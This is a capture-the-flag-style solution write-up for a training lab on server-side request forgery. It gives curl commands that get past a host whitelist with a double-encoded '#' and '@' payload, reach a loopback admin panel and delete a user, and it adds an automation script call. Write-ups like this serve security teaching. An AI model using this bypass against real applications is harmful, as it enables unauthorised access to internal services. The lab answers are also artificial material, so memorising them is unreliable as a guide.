# Solution — SSRF with whitelist-based input filter

## 1. Precondition

`GET /product?productId=1` contains:

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
  <select name="stockApi">
    <option value="http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1">London</option>
    ...
```

Control request:

```bash
curl -s -X POST "$LAB/product/stock" \
  --data-urlencode 'stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1'
# 353
```

## 2. The filter

```bash
curl -s -X POST "$LAB/product/stock" --data-urlencode 'stockApi=http://localhost/'
# HTTP 400  "External stock check host must be stock.weliketoshop.net"
```

The whitelist inspects the decoded string, and a `#` or `@` sent literally is
still judged: `http://localhost#@stock...` and `http://localhost%23@stock...`
are both rejected.

## 3. Double-encoded fragment

```bash
curl -s -X POST "$LAB/product/stock" \
  --data 'stockApi=http%3A%2F%2Flocalhost%2523%40stock.weliketoshop.net%2F'
# HTTP 200 — body is the shop home page served from localhost
```

Layer by layer:

| Layer | Value |
|---|---|
| on the wire | `http://localhost%2523@stock.weliketoshop.net/` |
| after the whitelist's decode | `http://localhost%23@stock.weliketoshop.net/` → host `stock.weliketoshop.net` ✅ |
| after the fetcher's decode | `http://localhost#@stock.weliketoshop.net/` → host `localhost`, `#` begins the fragment |

The `@` makes `localhost%23` look like userinfo to the whitelist parser; after
the second decode the `#` truncates the authority and the request goes to
loopback.

Note: keep `%2523` literal on the wire. Sending the value through a form encoder
that re-encodes `%` (`%252523`) breaks the second decode and the whitelist
rejects it. `&` inside the value must be encoded (`%26`) or the server reports
`"Missing parameter"`.

## 4. Admin panel → delete carlos

```bash
curl -s -X POST "$LAB/product/stock" \
  --data 'stockApi=http%3A%2F%2Flocalhost%2523%40stock.weliketoshop.net%2Fadmin'
# Admin panel, Users: wiener, carlos, delete links

curl -s -X POST "$LAB/product/stock" \
  --data 'stockApi=http%3A%2F%2Flocalhost%2523%40stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos'
# HTTP 200

curl -s "$LAB/" | grep -o 'is-solved\|<p>Solved</p>'
# is-solved / Solved
```

## 5. Automate

```bash
cd "EXPERT/SSRF-with-whitelist-based-input-filter"
uv run python solve.py --url "$LAB"
```

Exit 0 only when the lab widget reads `is-solved` / `<p>Solved</p>`.
